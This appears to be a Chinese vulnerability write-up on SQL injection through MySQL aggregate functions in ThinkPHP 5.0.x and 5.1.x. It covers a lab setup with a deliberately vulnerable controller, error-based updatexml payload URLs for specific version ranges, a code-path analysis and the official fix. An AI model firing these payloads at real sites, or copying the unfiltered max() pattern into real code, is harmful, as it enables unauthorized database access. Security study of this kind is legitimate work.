# 原创
：  ThinkPH5 SQL注入（Mysql 聚合函数）

# ThinkPH5 SQL注入（Mysql 聚合函数）

#### ThinkPH5 SQL注入（Mysql 聚合函数）

## 漏洞概要

> 



## 初始配置

> 
获取测试环境代码


```
composer create-project --prefer-dist topthink/think=5.1  tpH3rmesk1t

```

> 
将 composer.json 文件的 require 字段设置成如下


```
"require": {
    "php": "&gt;=5.6.0",
    "topthink/framework": "5.1.7"
}

```

> 
然后执行 `composer update`


> 



```
&lt;?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $options = request()-&gt;get('options');
        $result = db('users')-&gt;max($options);
        var_dump($result);
        return '&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style="font-size:30px"&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="eab4b9f840753f8e7"&gt;&lt;/think&gt;';
    }
}

```

> 
在`config/database.php`文件中配置数据库相关信息，并开启`config/app.php`中的app_debug和app_trace,创建数据库信息如下


```
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null,
);
insert into users(id,username) values(1,'H3rmesk1t');

```

## 漏洞利用

> 
Payload


```
5.0.0~5.0.21 、 5.1.3～5.1.10
http://127.0.0.1/cms/public/index.php?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
5.1.11～5.1.25 
http://127.0.0.1/cms/public/index.php?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23

```

## 漏洞分析

> 
用户可控数据未经过滤，传入 `Query` 类的 `max` 方法进行聚合查询语句构造，接着调用本类的 `aggregate` 方法，本次漏洞问题正是发生在该函数底层代码中，所以所有调用该方法的聚合方法均存在 SQL 注入问题，我们看到 `aggregate` 方法又调用了 `Mysql` 类的 `aggregate` 方法，在该方法中，我们可以明显看到程序将用户可控变量 `$field` 经过 `parseKey` 方法处理后，与 SQL 语句进行了拼接


> 
其余流程和之前的分析差不多，具体看看 `parseKey` 方法


> 
`parseKey` 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号，经过 `parseKey` 方法处理后，程序又回到了上图的 `$this-&gt;value()` 方法中，该方法会调用 `Builder` 类的 `select` 方法来构造 SQL 语句，这个方法应该说是在分析 ThinkPHP 漏洞时，非常常见的了，其无非就是使用 `str_replace` 方法，将变量替换到 SQL 语句模板中，这里重点关注 `parseField` 方法，因为用户可控数据存储在 `$options['field']` 变量中并被传入该方法


> 
进入 `parseField` 方法，我们发现用户可控数据只是经过 `parseKey` 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 SQL 语句模板里，导致 SQL注入漏洞 的发生


## 漏洞修复

> 
官方的修复方法是：当匹配到除了 字母、点号、星号 以外的字符时，就抛出异常


## 攻击总结

> 
参考Mochazz师傅的审计流程

